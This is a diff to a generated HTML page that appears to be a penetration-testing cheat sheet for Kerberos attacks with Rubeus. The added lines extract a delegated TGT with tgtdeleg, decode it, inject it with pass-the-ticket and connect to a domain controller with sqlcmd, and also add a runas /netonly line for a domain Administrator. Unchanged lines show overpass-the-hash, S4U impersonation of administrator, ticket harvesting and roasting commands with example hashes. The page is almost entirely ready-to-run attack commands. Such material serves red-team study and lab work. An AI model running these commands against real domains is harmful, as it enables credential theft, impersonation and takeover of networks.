@@ -28488,7 +28488,21 @@ https://github.com/mkdocs/mkdocs/blob/master/mkdocs/themes/mkdocs/content.html -
 <span class="normal"><a href="#__codelineno-0-115">115</a></span>
 <span class="normal"><a href="#__codelineno-0-116">116</a></span>
 <span class="normal"><a href="#__codelineno-0-117">117</a></span>
-<span class="normal"><a href="#__codelineno-0-118">118</a></span></pre></div></td><td class="code"><div><pre><span></span><code><span id="__span-0-1"><a id="__codelineno-0-1" name="__codelineno-0-1"></a>########################################
+<span class="normal"><a href="#__codelineno-0-118">118</a></span>
+<span class="normal"><a href="#__codelineno-0-119">119</a></span>
+<span class="normal"><a href="#__codelineno-0-120">120</a></span>
+<span class="normal"><a href="#__codelineno-0-121">121</a></span>
+<span class="normal"><a href="#__codelineno-0-122">122</a></span>
+<span class="normal"><a href="#__codelineno-0-123">123</a></span>
+<span class="normal"><a href="#__codelineno-0-124">124</a></span>
+<span class="normal"><a href="#__codelineno-0-125">125</a></span>
+<span class="normal"><a href="#__codelineno-0-126">126</a></span>
+<span class="normal"><a href="#__codelineno-0-127">127</a></span>
+<span class="normal"><a href="#__codelineno-0-128">128</a></span>
+<span class="normal"><a href="#__codelineno-0-129">129</a></span>
+<span class="normal"><a href="#__codelineno-0-130">130</a></span>
+<span class="normal"><a href="#__codelineno-0-131">131</a></span>
+<span class="normal"><a href="#__codelineno-0-132">132</a></span></pre></div></td><td class="code"><div><pre><span></span><code><span id="__span-0-1"><a id="__codelineno-0-1" name="__codelineno-0-1"></a>########################################
 </span><span id="__span-0-2"><a id="__codelineno-0-2" name="__codelineno-0-2"></a># Kerberoasting stats (discover roastable accounts without requesting tickets)
 </span><span id="__span-0-3"><a id="__codelineno-0-3" name="__codelineno-0-3"></a>########################################
 </span><span id="__span-0-4"><a id="__codelineno-0-4" name="__codelineno-0-4"></a>
@@ -28509,103 +28523,117 @@ https://github.com/mkdocs/mkdocs/blob/master/mkdocs/themes/mkdocs/content.html -
 </span><span id="__span-0-19"><a id="__codelineno-0-19" name="__codelineno-0-19"></a># Dump all tickets  
 </span><span id="__span-0-20"><a id="__codelineno-0-20" name="__codelineno-0-20"></a>.\Rubeus.exe dump
 </span><span id="__span-0-21"><a id="__codelineno-0-21" name="__codelineno-0-21"></a>
-</span><span id="__span-0-22"><a id="__codelineno-0-22" name="__codelineno-0-22"></a>########################################  
-</span><span id="__span-0-23"><a id="__codelineno-0-23" name="__codelineno-0-23"></a># Request a TGT using plaintext credentials  
-</span><span id="__span-0-24"><a id="__codelineno-0-24" name="__codelineno-0-24"></a>########################################  
-</span><span id="__span-0-25"><a id="__codelineno-0-25" name="__codelineno-0-25"></a>
-</span><span id="__span-0-26"><a id="__codelineno-0-26" name="__codelineno-0-26"></a># Request a TGT  
-</span><span id="__span-0-27"><a id="__codelineno-0-27" name="__codelineno-0-27"></a>.\Rubeus.exe asktgt /user:&lt;USER&gt; /password:&lt;PASSWORD&gt; /domain:&lt;DOMAIN&gt;  
-</span><span id="__span-0-28"><a id="__codelineno-0-28" name="__codelineno-0-28"></a>
-</span><span id="__span-0-29"><a id="__codelineno-0-29" name="__codelineno-0-29"></a># Example  
-</span><span id="__span-0-30"><a id="__codelineno-0-30" name="__codelineno-0-30"></a>.\Rubeus.exe asktgt /user:john /password:P@ssw0rd123 /domain:corp.local  
-</span><span id="__span-0-31"><a id="__codelineno-0-31" name="__codelineno-0-31"></a>
-</span><span id="__span-0-32"><a id="__codelineno-0-32" name="__codelineno-0-32"></a>
-</span><span id="__span-0-33"><a id="__codelineno-0-33" name="__codelineno-0-33"></a>########################################  
-</span><span id="__span-0-34"><a id="__codelineno-0-34" name="__codelineno-0-34"></a># Request a TGT using NTLM hash (Overpass-the-Hash)  
-</span><span id="__span-0-35"><a id="__codelineno-0-35" name="__codelineno-0-35"></a>########################################  
-</span><span id="__span-0-36"><a id="__codelineno-0-36" name="__codelineno-0-36"></a>
-</span><span id="__span-0-37"><a id="__codelineno-0-37" name="__codelineno-0-37"></a># Request TGT using NTLM hash  
-</span><span id="__span-0-38"><a id="__codelineno-0-38" name="__codelineno-0-38"></a>.\Rubeus.exe asktgt /user:&lt;USER&gt; /rc4:&lt;NTLM_HASH&gt; /domain:&lt;DOMAIN&gt;  
+</span><span id="__span-0-22"><a id="__codelineno-0-22" name="__codelineno-0-22"></a>
+</span><span id="__span-0-23"><a id="__codelineno-0-23" name="__codelineno-0-23"></a>#####
+</span><span id="__span-0-24"><a id="__codelineno-0-24" name="__codelineno-0-24"></a># Inject a ticket and use it
+</span><span id="__span-0-25"><a id="__codelineno-0-25" name="__codelineno-0-25"></a>#####
+</span><span id="__span-0-26"><a id="__codelineno-0-26" name="__codelineno-0-26"></a># Create a base64(ticket.kirbi):
+</span><span id="__span-0-27"><a id="__codelineno-0-27" name="__codelineno-0-27"></a>.\Rubeus.exe tgtdeleg  /nowrap
+</span><span id="__span-0-28"><a id="__codelineno-0-28" name="__codelineno-0-28"></a># In kali, remove line breaks from base64 blob  
+</span><span id="__span-0-29"><a id="__codelineno-0-29" name="__codelineno-0-29"></a>echo &quot;&lt;base64 blob&gt;&quot; | tr -d \\n  &gt; encode_file
+</span><span id="__span-0-30"><a id="__codelineno-0-30" name="__codelineno-0-30"></a># Decode base64 ticket into .kirbi file  
+</span><span id="__span-0-31"><a id="__codelineno-0-31" name="__codelineno-0-31"></a>cat encoded_file | base64 -d &gt; ticket.kirbi 
+</span><span id="__span-0-32"><a id="__codelineno-0-32" name="__codelineno-0-32"></a># Upload the ticket.kirbi to the target, and use it 
+</span><span id="__span-0-33"><a id="__codelineno-0-33" name="__codelineno-0-33"></a>.\Rubeus.exe ptt /ticket:ticket.kirbi
+</span><span id="__span-0-34"><a id="__codelineno-0-34" name="__codelineno-0-34"></a>sqlcmd -S DC01.zeus.corp -E
+</span><span id="__span-0-35"><a id="__codelineno-0-35" name="__codelineno-0-35"></a>
+</span><span id="__span-0-36"><a id="__codelineno-0-36" name="__codelineno-0-36"></a>########################################  
+</span><span id="__span-0-37"><a id="__codelineno-0-37" name="__codelineno-0-37"></a># Request a TGT using plaintext credentials  
+</span><span id="__span-0-38"><a id="__codelineno-0-38" name="__codelineno-0-38"></a>########################################  
 </span><span id="__span-0-39"><a id="__codelineno-0-39" name="__codelineno-0-39"></a>
-</span><span id="__span-0-40"><a id="__codelineno-0-40" name="__codelineno-0-40"></a># Example  
-</span><span id="__span-0-41"><a id="__codelineno-0-41" name="__codelineno-0-41"></a>.\Rubeus.exe asktgt /user:administrator /rc4:8846f7eaee8fb117ad06bdd830b7586c /domain:corp.local  
+</span><span id="__span-0-40"><a id="__codelineno-0-40" name="__codelineno-0-40"></a># Request a TGT  
+</span><span id="__span-0-41"><a id="__codelineno-0-41" name="__codelineno-0-41"></a>.\Rubeus.exe asktgt /user:&lt;USER&gt; /password:&lt;PASSWORD&gt; /domain:&lt;DOMAIN&gt;  
 </span><span id="__span-0-42"><a id="__codelineno-0-42" name="__codelineno-0-42"></a>
-</span><span id="__span-0-43"><a id="__codelineno-0-43" name="__codelineno-0-43"></a>
-</span><span id="__span-0-44"><a id="__codelineno-0-44" name="__codelineno-0-44"></a>########################################  
-</span><span id="__span-0-45"><a id="__codelineno-0-45" name="__codelineno-0-45"></a># Request TGT using AES key  
-</span><span id="__span-0-46"><a id="__codelineno-0-46" name="__codelineno-0-46"></a>########################################  
-</span><span id="__span-0-47"><a id="__codelineno-0-47" name="__codelineno-0-47"></a>
-</span><span id="__span-0-48"><a id="__codelineno-0-48" name="__codelineno-0-48"></a># Request TGT using AES256 key  
-</span><span id="__span-0-49"><a id="__codelineno-0-49" name="__codelineno-0-49"></a>.\Rubeus.exe asktgt /user:&lt;USER&gt; /aes256:&lt;AES_KEY&gt; /domain:&lt;DOMAIN&gt;  
+</span><span id="__span-0-43"><a id="__codelineno-0-43" name="__codelineno-0-43"></a># Example  
+</span><span id="__span-0-44"><a id="__codelineno-0-44" name="__codelineno-0-44"></a>.\Rubeus.exe asktgt /user:john /password:P@ssw0rd123 /domain:corp.local  
+</span><span id="__span-0-45"><a id="__codelineno-0-45" name="__codelineno-0-45"></a>
+</span><span id="__span-0-46"><a id="__codelineno-0-46" name="__codelineno-0-46"></a>
+</span><span id="__span-0-47"><a id="__codelineno-0-47" name="__codelineno-0-47"></a>########################################  
+</span><span id="__span-0-48"><a id="__codelineno-0-48" name="__codelineno-0-48"></a># Request a TGT using NTLM hash (Overpass-the-Hash)  
+</span><span id="__span-0-49"><a id="__codelineno-0-49" name="__codelineno-0-49"></a>########################################  
 </span><span id="__span-0-50"><a id="__codelineno-0-50" name="__codelineno-0-50"></a>
-</span><span id="__span-0-51"><a id="__codelineno-0-51" name="__codelineno-0-51"></a># Example  
-</span><span id="__span-0-52"><a id="__codelineno-0-52" name="__codelineno-0-52"></a>.\Rubeus.exe asktgt /user:administrator /aes256:4f8b42c27bfa8e6a1c3d95d7f2f8c7c23f9f9c0d7e92b3b3bfb39d9b2e8d3c4a /domain:corp.local  
+</span><span id="__span-0-51"><a id="__codelineno-0-51" name="__codelineno-0-51"></a># Request TGT using NTLM hash  
+</span><span id="__span-0-52"><a id="__codelineno-0-52" name="__codelineno-0-52"></a>.\Rubeus.exe asktgt /user:&lt;USER&gt; /rc4:&lt;NTLM_HASH&gt; /domain:&lt;DOMAIN&gt;  
 </span><span id="__span-0-53"><a id="__codelineno-0-53" name="__codelineno-0-53"></a>
-</span><span id="__span-0-54"><a id="__codelineno-0-54" name="__codelineno-0-54"></a>
-</span><span id="__span-0-55"><a id="__codelineno-0-55" name="__codelineno-0-55"></a>########################################  
-</span><span id="__span-0-56"><a id="__codelineno-0-56" name="__codelineno-0-56"></a># Request a service ticket (TGS)  
-</span><span id="__span-0-57"><a id="__codelineno-0-57" name="__codelineno-0-57"></a>########################################  
-</span><span id="__span-0-58"><a id="__codelineno-0-58" name="__codelineno-0-58"></a>
-</span><span id="__span-0-59"><a id="__codelineno-0-59" name="__codelineno-0-59"></a># Request service ticket  
-</span><span id="__span-0-60"><a id="__codelineno-0-60" name="__codelineno-0-60"></a>.\Rubeus.exe asktgs /ticket:&lt;TGT_KIRBI&gt; /service:&lt;SPN&gt;  
+</span><span id="__span-0-54"><a id="__codelineno-0-54" name="__codelineno-0-54"></a># Example  
+</span><span id="__span-0-55"><a id="__codelineno-0-55" name="__codelineno-0-55"></a>.\Rubeus.exe asktgt /user:administrator /rc4:8846f7eaee8fb117ad06bdd830b7586c /domain:corp.local  
+</span><span id="__span-0-56"><a id="__codelineno-0-56" name="__codelineno-0-56"></a>
+</span><span id="__span-0-57"><a id="__codelineno-0-57" name="__codelineno-0-57"></a>
+</span><span id="__span-0-58"><a id="__codelineno-0-58" name="__codelineno-0-58"></a>########################################  
+</span><span id="__span-0-59"><a id="__codelineno-0-59" name="__codelineno-0-59"></a># Request TGT using AES key  
+</span><span id="__span-0-60"><a id="__codelineno-0-60" name="__codelineno-0-60"></a>########################################  
 </span><span id="__span-0-61"><a id="__codelineno-0-61" name="__codelineno-0-61"></a>
-</span><span id="__span-0-62"><a id="__codelineno-0-62" name="__codelineno-0-62"></a># Example  
-</span><span id="__span-0-63"><a id="__codelineno-0-63" name="__codelineno-0-63"></a>.\Rubeus.exe asktgs /ticket:admin.kirbi /service:cifs/fileserver.corp.local  
+</span><span id="__span-0-62"><a id="__codelineno-0-62" name="__codelineno-0-62"></a># Request TGT using AES256 key  
+</span><span id="__span-0-63"><a id="__codelineno-0-63" name="__codelineno-0-63"></a>.\Rubeus.exe asktgt /user:&lt;USER&gt; /aes256:&lt;AES_KEY&gt; /domain:&lt;DOMAIN&gt;  
 </span><span id="__span-0-64"><a id="__codelineno-0-64" name="__codelineno-0-64"></a>
-</span><span id="__span-0-65"><a id="__codelineno-0-65" name="__codelineno-0-65"></a>
-</span><span id="__span-0-66"><a id="__codelineno-0-66" name="__codelineno-0-66"></a>########################################  
-</span><span id="__span-0-67"><a id="__codelineno-0-67" name="__codelineno-0-67"></a># S4U constrained delegation attack  
-</span><span id="__span-0-68"><a id="__codelineno-0-68" name="__codelineno-0-68"></a>########################################  
-</span><span id="__span-0-69"><a id="__codelineno-0-69" name="__codelineno-0-69"></a>
-</span><span id="__span-0-70"><a id="__codelineno-0-70" name="__codelineno-0-70"></a># Request service ticket on behalf of another user  
-</span><span id="__span-0-71"><a id="__codelineno-0-71" name="__codelineno-0-71"></a>.\Rubeus.exe s4u /user:&lt;SERVICE_ACCOUNT&gt; /rc4:&lt;HASH&gt; /impersonateuser:&lt;TARGET_USER&gt; /msdsspn:&lt;SPN&gt; /domain:&lt;DOMAIN&gt; /ptt  
+</span><span id="__span-0-65"><a id="__codelineno-0-65" name="__codelineno-0-65"></a># Example  
+</span><span id="__span-0-66"><a id="__codelineno-0-66" name="__codelineno-0-66"></a>.\Rubeus.exe asktgt /user:administrator /aes256:4f8b42c27bfa8e6a1c3d95d7f2f8c7c23f9f9c0d7e92b3b3bfb39d9b2e8d3c4a /domain:corp.local  
+</span><span id="__span-0-67"><a id="__codelineno-0-67" name="__codelineno-0-67"></a>
+</span><span id="__span-0-68"><a id="__codelineno-0-68" name="__codelineno-0-68"></a>
+</span><span id="__span-0-69"><a id="__codelineno-0-69" name="__codelineno-0-69"></a>########################################  
+</span><span id="__span-0-70"><a id="__codelineno-0-70" name="__codelineno-0-70"></a># Request a service ticket (TGS)  
+</span><span id="__span-0-71"><a id="__codelineno-0-71" name="__codelineno-0-71"></a>########################################  
 </span><span id="__span-0-72"><a id="__codelineno-0-72" name="__codelineno-0-72"></a>
-</span><span id="__span-0-73"><a id="__codelineno-0-73" name="__codelineno-0-73"></a># Example  
-</span><span id="__span-0-74"><a id="__codelineno-0-74" name="__codelineno-0-74"></a>.\Rubeus.exe s4u /user:websvc /rc4:8846f7eaee8fb117ad06bdd830b7586c /impersonateuser:administrator /msdsspn:cifs/fileserver.corp.local /domain:corp.local /ptt  
+</span><span id="__span-0-73"><a id="__codelineno-0-73" name="__codelineno-0-73"></a># Request service ticket  
+</span><span id="__span-0-74"><a id="__codelineno-0-74" name="__codelineno-0-74"></a>.\Rubeus.exe asktgs /ticket:&lt;TGT_KIRBI&gt; /service:&lt;SPN&gt;  
 </span><span id="__span-0-75"><a id="__codelineno-0-75" name="__codelineno-0-75"></a>
-</span><span id="__span-0-76"><a id="__codelineno-0-76" name="__codelineno-0-76"></a>
-</span><span id="__span-0-77"><a id="__codelineno-0-77" name="__codelineno-0-77"></a>########################################  
-</span><span id="__span-0-78"><a id="__codelineno-0-78" name="__codelineno-0-78"></a># Monitor Kerberos tickets in memory  
-</span><span id="__span-0-79"><a id="__codelineno-0-79" name="__codelineno-0-79"></a>########################################  
-</span><span id="__span-0-80"><a id="__codelineno-0-80" name="__codelineno-0-80"></a>
-</span><span id="__span-0-81"><a id="__codelineno-0-81" name="__codelineno-0-81"></a># Monitor ticket activity  
-</span><span id="__span-0-82"><a id="__codelineno-0-82" name="__codelineno-0-82"></a>.\Rubeus.exe monitor  
+</span><span id="__span-0-76"><a id="__codelineno-0-76" name="__codelineno-0-76"></a># Example  
+</span><span id="__span-0-77"><a id="__codelineno-0-77" name="__codelineno-0-77"></a>.\Rubeus.exe asktgs /ticket:admin.kirbi /service:cifs/fileserver.corp.local  
+</span><span id="__span-0-78"><a id="__codelineno-0-78" name="__codelineno-0-78"></a>
+</span><span id="__span-0-79"><a id="__codelineno-0-79" name="__codelineno-0-79"></a>
+</span><span id="__span-0-80"><a id="__codelineno-0-80" name="__codelineno-0-80"></a>########################################  
+</span><span id="__span-0-81"><a id="__codelineno-0-81" name="__codelineno-0-81"></a># S4U constrained delegation attack  
+</span><span id="__span-0-82"><a id="__codelineno-0-82" name="__codelineno-0-82"></a>########################################  
 </span><span id="__span-0-83"><a id="__codelineno-0-83" name="__codelineno-0-83"></a>
-</span><span id="__span-0-84"><a id="__codelineno-0-84" name="__codelineno-0-84"></a># Example  
-</span><span id="__span-0-85"><a id="__codelineno-0-85" name="__codelineno-0-85"></a>.\Rubeus.exe monitor  
+</span><span id="__span-0-84"><a id="__codelineno-0-84" name="__codelineno-0-84"></a># Request service ticket on behalf of another user  
+</span><span id="__span-0-85"><a id="__codelineno-0-85" name="__codelineno-0-85"></a>.\Rubeus.exe s4u /user:&lt;SERVICE_ACCOUNT&gt; /rc4:&lt;HASH&gt; /impersonateuser:&lt;TARGET_USER&gt; /msdsspn:&lt;SPN&gt; /domain:&lt;DOMAIN&gt; /ptt  
 </span><span id="__span-0-86"><a id="__codelineno-0-86" name="__codelineno-0-86"></a>
-</span><span id="__span-0-87"><a id="__codelineno-0-87" name="__codelineno-0-87"></a>
-</span><span id="__span-0-88"><a id="__codelineno-0-88" name="__codelineno-0-88"></a>########################################  
-</span><span id="__span-0-89"><a id="__codelineno-0-89" name="__codelineno-0-89"></a># Capture new TGTs appearing in memory  
-</span><span id="__span-0-90"><a id="__codelineno-0-90" name="__codelineno-0-90"></a>########################################  
-</span><span id="__span-0-91"><a id="__codelineno-0-91" name="__codelineno-0-91"></a>
-</span><span id="__span-0-92"><a id="__codelineno-0-92" name="__codelineno-0-92"></a># Monitor for new TGTs  
-</span><span id="__span-0-93"><a id="__codelineno-0-93" name="__codelineno-0-93"></a>.\Rubeus.exe harvest  
+</span><span id="__span-0-87"><a id="__codelineno-0-87" name="__codelineno-0-87"></a># Example  
+</span><span id="__span-0-88"><a id="__codelineno-0-88" name="__codelineno-0-88"></a>.\Rubeus.exe s4u /user:websvc /rc4:8846f7eaee8fb117ad06bdd830b7586c /impersonateuser:administrator /msdsspn:cifs/fileserver.corp.local /domain:corp.local /ptt  
+</span><span id="__span-0-89"><a id="__codelineno-0-89" name="__codelineno-0-89"></a>
+</span><span id="__span-0-90"><a id="__codelineno-0-90" name="__codelineno-0-90"></a>
+</span><span id="__span-0-91"><a id="__codelineno-0-91" name="__codelineno-0-91"></a>########################################  
+</span><span id="__span-0-92"><a id="__codelineno-0-92" name="__codelineno-0-92"></a># Monitor Kerberos tickets in memory  
+</span><span id="__span-0-93"><a id="__codelineno-0-93" name="__codelineno-0-93"></a>########################################  
 </span><span id="__span-0-94"><a id="__codelineno-0-94" name="__codelineno-0-94"></a>
-</span><span id="__span-0-95"><a id="__codelineno-0-95" name="__codelineno-0-95"></a># Example  
-</span><span id="__span-0-96"><a id="__codelineno-0-96" name="__codelineno-0-96"></a>.\Rubeus.exe harvest  
+</span><span id="__span-0-95"><a id="__codelineno-0-95" name="__codelineno-0-95"></a># Monitor ticket activity  
+</span><span id="__span-0-96"><a id="__codelineno-0-96" name="__codelineno-0-96"></a>.\Rubeus.exe monitor  
 </span><span id="__span-0-97"><a id="__codelineno-0-97" name="__codelineno-0-97"></a>
-</span><span id="__span-0-98"><a id="__codelineno-0-98" name="__codelineno-0-98"></a>
-</span><span id="__span-0-99"><a id="__codelineno-0-99" name="__codelineno-0-99"></a>########################################  
-</span><span id="__span-0-100"><a id="__codelineno-0-100" name="__codelineno-0-100"></a># Renew a Kerberos TGT  
-</span><span id="__span-0-101"><a id="__codelineno-0-101" name="__codelineno-0-101"></a>########################################  
-</span><span id="__span-0-102"><a id="__codelineno-0-102" name="__codelineno-0-102"></a>
-</span><span id="__span-0-103"><a id="__codelineno-0-103" name="__codelineno-0-103"></a># Renew TGT  
-</span><span id="__span-0-104"><a id="__codelineno-0-104" name="__codelineno-0-104"></a>.\Rubeus.exe renew /ticket:&lt;TGT_KIRBI&gt;  
+</span><span id="__span-0-98"><a id="__codelineno-0-98" name="__codelineno-0-98"></a># Example  
+</span><span id="__span-0-99"><a id="__codelineno-0-99" name="__codelineno-0-99"></a>.\Rubeus.exe monitor  
+</span><span id="__span-0-100"><a id="__codelineno-0-100" name="__codelineno-0-100"></a>
+</span><span id="__span-0-101"><a id="__codelineno-0-101" name="__codelineno-0-101"></a>
+</span><span id="__span-0-102"><a id="__codelineno-0-102" name="__codelineno-0-102"></a>########################################  
+</span><span id="__span-0-103"><a id="__codelineno-0-103" name="__codelineno-0-103"></a># Capture new TGTs appearing in memory  
+</span><span id="__span-0-104"><a id="__codelineno-0-104" name="__codelineno-0-104"></a>########################################  
 </span><span id="__span-0-105"><a id="__codelineno-0-105" name="__codelineno-0-105"></a>
-</span><span id="__span-0-106"><a id="__codelineno-0-106" name="__codelineno-0-106"></a># Example  
-</span><span id="__span-0-107"><a id="__codelineno-0-107" name="__codelineno-0-107"></a>.\Rubeus.exe renew /ticket:admin.kirbi  
+</span><span id="__span-0-106"><a id="__codelineno-0-106" name="__codelineno-0-106"></a># Monitor for new TGTs  
+</span><span id="__span-0-107"><a id="__codelineno-0-107" name="__codelineno-0-107"></a>.\Rubeus.exe harvest  
 </span><span id="__span-0-108"><a id="__codelineno-0-108" name="__codelineno-0-108"></a>
-</span><span id="__span-0-109"><a id="__codelineno-0-109" name="__codelineno-0-109"></a>
-</span><span id="__span-0-110"><a id="__codelineno-0-110" name="__codelineno-0-110"></a>########################################  
-</span><span id="__span-0-111"><a id="__codelineno-0-111" name="__codelineno-0-111"></a># Convert kirbi ticket to base64  
-</span><span id="__span-0-112"><a id="__codelineno-0-112" name="__codelineno-0-112"></a>########################################  
-</span><span id="__span-0-113"><a id="__codelineno-0-113" name="__codelineno-0-113"></a>
-</span><span id="__span-0-114"><a id="__codelineno-0-114" name="__codelineno-0-114"></a># Convert ticket  
-</span><span id="__span-0-115"><a id="__codelineno-0-115" name="__codelineno-0-115"></a>.\Rubeus.exe describe /ticket:&lt;TICKET&gt;  
+</span><span id="__span-0-109"><a id="__codelineno-0-109" name="__codelineno-0-109"></a># Example  
+</span><span id="__span-0-110"><a id="__codelineno-0-110" name="__codelineno-0-110"></a>.\Rubeus.exe harvest  
+</span><span id="__span-0-111"><a id="__codelineno-0-111" name="__codelineno-0-111"></a>
+</span><span id="__span-0-112"><a id="__codelineno-0-112" name="__codelineno-0-112"></a>
+</span><span id="__span-0-113"><a id="__codelineno-0-113" name="__codelineno-0-113"></a>########################################  
+</span><span id="__span-0-114"><a id="__codelineno-0-114" name="__codelineno-0-114"></a># Renew a Kerberos TGT  
+</span><span id="__span-0-115"><a id="__codelineno-0-115" name="__codelineno-0-115"></a>########################################  
 </span><span id="__span-0-116"><a id="__codelineno-0-116" name="__codelineno-0-116"></a>
-</span><span id="__span-0-117"><a id="__codelineno-0-117" name="__codelineno-0-117"></a># Example  
-</span><span id="__span-0-118"><a id="__codelineno-0-118" name="__codelineno-0-118"></a>.\Rubeus.exe describe /ticket:admin.kirbi
+</span><span id="__span-0-117"><a id="__codelineno-0-117" name="__codelineno-0-117"></a># Renew TGT  
+</span><span id="__span-0-118"><a id="__codelineno-0-118" name="__codelineno-0-118"></a>.\Rubeus.exe renew /ticket:&lt;TGT_KIRBI&gt;  
+</span><span id="__span-0-119"><a id="__codelineno-0-119" name="__codelineno-0-119"></a>
+</span><span id="__span-0-120"><a id="__codelineno-0-120" name="__codelineno-0-120"></a># Example  
+</span><span id="__span-0-121"><a id="__codelineno-0-121" name="__codelineno-0-121"></a>.\Rubeus.exe renew /ticket:admin.kirbi  
+</span><span id="__span-0-122"><a id="__codelineno-0-122" name="__codelineno-0-122"></a>
+</span><span id="__span-0-123"><a id="__codelineno-0-123" name="__codelineno-0-123"></a>
+</span><span id="__span-0-124"><a id="__codelineno-0-124" name="__codelineno-0-124"></a>########################################  
+</span><span id="__span-0-125"><a id="__codelineno-0-125" name="__codelineno-0-125"></a># Convert kirbi ticket to base64  
+</span><span id="__span-0-126"><a id="__codelineno-0-126" name="__codelineno-0-126"></a>########################################  
+</span><span id="__span-0-127"><a id="__codelineno-0-127" name="__codelineno-0-127"></a>
+</span><span id="__span-0-128"><a id="__codelineno-0-128" name="__codelineno-0-128"></a># Convert ticket  
+</span><span id="__span-0-129"><a id="__codelineno-0-129" name="__codelineno-0-129"></a>.\Rubeus.exe describe /ticket:&lt;TICKET&gt;  
+</span><span id="__span-0-130"><a id="__codelineno-0-130" name="__codelineno-0-130"></a>
+</span><span id="__span-0-131"><a id="__codelineno-0-131" name="__codelineno-0-131"></a># Example  
+</span><span id="__span-0-132"><a id="__codelineno-0-132" name="__codelineno-0-132"></a>.\Rubeus.exe describe /ticket:admin.kirbi
 </span></code></pre></div></td></tr></table></div>
 <h3 id="kerberoasting">Kerberoasting</h3>
 <div class="language-text highlight"><table class="highlighttable"><tr><td class="linenos"><div class="linenodiv"><pre><span></span><span class="normal"><a href="#__codelineno-1-1"> 1</a></span>
@@ -28830,15 +28858,18 @@ https://github.com/mkdocs/mkdocs/blob/master/mkdocs/themes/mkdocs/content.html -
 </span><span id="__span-2-16"><a id="__codelineno-2-16" name="__codelineno-2-16"></a>.\Rubeus.exe asreproast /nowrap /format:hashcat
 </span></code></pre></div></td></tr></table></div>
 <h3 id="pass-the-ticket">Pass-the-Ticket</h3>
-<div class="language-text highlight"><table class="highlighttable"><tr><td class="linenos"><div class="linenodiv"><pre><span></span><span class="normal"><a href="#__codelineno-3-1">1</a></span>
-<span class="normal"><a href="#__codelineno-3-2">2</a></span>
-<span class="normal"><a href="#__codelineno-3-3">3</a></span>
-<span class="normal"><a href="#__codelineno-3-4">4</a></span>
-<span class="normal"><a href="#__codelineno-3-5">5</a></span>
-<span class="normal"><a href="#__codelineno-3-6">6</a></span>
-<span class="normal"><a href="#__codelineno-3-7">7</a></span>
-<span class="normal"><a href="#__codelineno-3-8">8</a></span>
-<span class="normal"><a href="#__codelineno-3-9">9</a></span></pre></div></td><td class="code"><div><pre><span></span><code><span id="__span-3-1"><a id="__codelineno-3-1" name="__codelineno-3-1"></a>########################################
+<div class="language-text highlight"><table class="highlighttable"><tr><td class="linenos"><div class="linenodiv"><pre><span></span><span class="normal"><a href="#__codelineno-3-1"> 1</a></span>
+<span class="normal"><a href="#__codelineno-3-2"> 2</a></span>
+<span class="normal"><a href="#__codelineno-3-3"> 3</a></span>
+<span class="normal"><a href="#__codelineno-3-4"> 4</a></span>
+<span class="normal"><a href="#__codelineno-3-5"> 5</a></span>
+<span class="normal"><a href="#__codelineno-3-6"> 6</a></span>
+<span class="normal"><a href="#__codelineno-3-7"> 7</a></span>
+<span class="normal"><a href="#__codelineno-3-8"> 8</a></span>
+<span class="normal"><a href="#__codelineno-3-9"> 9</a></span>
+<span class="normal"><a href="#__codelineno-3-10">10</a></span>
+<span class="normal"><a href="#__codelineno-3-11">11</a></span>
+<span class="normal"><a href="#__codelineno-3-12">12</a></span></pre></div></td><td class="code"><div><pre><span></span><code><span id="__span-3-1"><a id="__codelineno-3-1" name="__codelineno-3-1"></a>########################################
 </span><span id="__span-3-2"><a id="__codelineno-3-2" name="__codelineno-3-2"></a># Pass-the-Ticket with Rubeus
 </span><span id="__span-3-3"><a id="__codelineno-3-3" name="__codelineno-3-3"></a>########################################
 </span><span id="__span-3-4"><a id="__codelineno-3-4" name="__codelineno-3-4"></a>
@@ -28847,6 +28878,9 @@ https://github.com/mkdocs/mkdocs/blob/master/mkdocs/themes/mkdocs/content.html -
 </span><span id="__span-3-7"><a id="__codelineno-3-7" name="__codelineno-3-7"></a>
 </span><span id="__span-3-8"><a id="__codelineno-3-8" name="__codelineno-3-8"></a># Example
 </span><span id="__span-3-9"><a id="__codelineno-3-9" name="__codelineno-3-9"></a>.\Rubeus.exe ptt /ticket:C:\tools\julio.kirbi
+</span><span id="__span-3-10"><a id="__codelineno-3-10" name="__codelineno-3-10"></a>
+</span><span id="__span-3-11"><a id="__codelineno-3-11" name="__codelineno-3-11"></a>
+</span><span id="__span-3-12"><a id="__codelineno-3-12" name="__codelineno-3-12"></a>runas /netonly /user:NAGOYA\Administrator powershell
 </span></code></pre></div></td></tr></table></div>
 <h3 id="kerberos-ticket-cracking">Kerberos ticket cracking</h3>
 <div class="language-text highlight"><table class="highlighttable"><tr><td class="linenos"><div class="linenodiv"><pre><span></span><span class="normal"><a href="#__codelineno-4-1"> 1</a></span>
@@ -28960,7 +28994,7 @@ https://github.com/mkdocs/mkdocs/blob/master/mkdocs/themes/mkdocs/content.html -
 
 <!-- This section adds support for localized revision dates -->
 
-    <small>Last update: <span class="git-revision-date-localized-plugin git-revision-date-localized-plugin-timeago" title="March 7, 2026 21:02:17 UTC"><span class="timeago" datetime="2026-03-07T21:02:17+00:00" locale="en"></span></span><span class="git-revision-date-localized-plugin git-revision-date-localized-plugin-iso_date" title="March 7, 2026 21:02:17 UTC">2026-03-07</span></small></br>
+    <small>Last update: <span class="git-revision-date-localized-plugin git-revision-date-localized-plugin-timeago" title="March 30, 2026 20:15:40 UTC"><span class="timeago" datetime="2026-03-30T20:15:40+00:00" locale="en"></span></span><span class="git-revision-date-localized-plugin git-revision-date-localized-plugin-iso_date" title="March 30, 2026 20:15:40 UTC">2026-03-30</span></small></br>
 
 
     <small>Created: December 27, 2024 22:00:41</small>
